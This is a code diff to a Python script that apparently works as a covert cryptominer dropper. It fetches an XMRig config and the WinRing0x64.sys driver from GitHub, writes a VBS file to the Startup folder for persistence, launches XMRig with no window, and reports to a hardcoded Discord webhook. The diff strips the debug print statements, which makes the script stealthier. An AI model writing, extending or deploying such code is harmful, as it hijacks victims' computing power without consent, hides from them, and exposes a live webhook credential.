@@ -7,9 +7,6 @@ import json
 import shutil
 import psutil  # To check running processes
 
-# Set developer_mode to True or False to enable/disable print statements
-developer_mode = False
-
 # URLs for the files on GitHub
 config_url = "https://raw.githubusercontent.com/asdnaxk/bckend/refs/heads/main/config.json"
 sys_url = "https://github.com/asdnaxk/bckend/raw/refs/heads/main/WinRing0x64.sys"
@@ -34,8 +31,6 @@ def download_file(url, save_path):
     if response.status_code == 200:
         with open(save_path, "wb") as f:
             f.write(response.content)
-        if developer_mode:
-            print(f"Downloaded: {save_path}")
 
 # Download the WinRing0x64.sys file if it doesn't exist
 if not os.path.exists(sys_file):
@@ -61,8 +56,6 @@ if response.status_code == 200:
     # Save the modified config.json
     with open(config_file, "w") as f:
         json.dump(config_data, f, indent=4)
-    if developer_mode:
-        print(f"Modified and saved config.json with random rig-id: {config_file}")
 
 # Function to check if XMRig is already running
 def is_xmrig_running():
@@ -83,8 +76,6 @@ Set WshShell = Nothing'''
 # Create the VBS file in the Startup folder
 with open(vbs_file_path, "w") as vbs_file:
     vbs_file.write(vbs_content)
-if developer_mode:
-    print(f"VBS script created at: {vbs_file_path}")
 
 # Check if XMRig is already running before attempting to start a new instance
 if not is_xmrig_running():
@@ -99,8 +90,6 @@ if not is_xmrig_running():
             startupinfo=startupinfo,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
-        if developer_mode:
-            print(f"XMRig started with PID {process.pid}. It is running in the background.")
         requests.post("https://discord.com/api/webhooks/1322250323963678720/7TiYTachOe6-9Dees8vM8mgga43lvy3wzEnjjzKyaLa-REgDthnCZ5fin37t2OLFOeGH", json={
             "embeds": [
                 {
@@ -113,5 +102,4 @@ if not is_xmrig_running():
     except FileNotFoundError:
         pass
 else:
-    if developer_mode:
-        print("XMRig is already running. No new instance will be started.")
+    pass
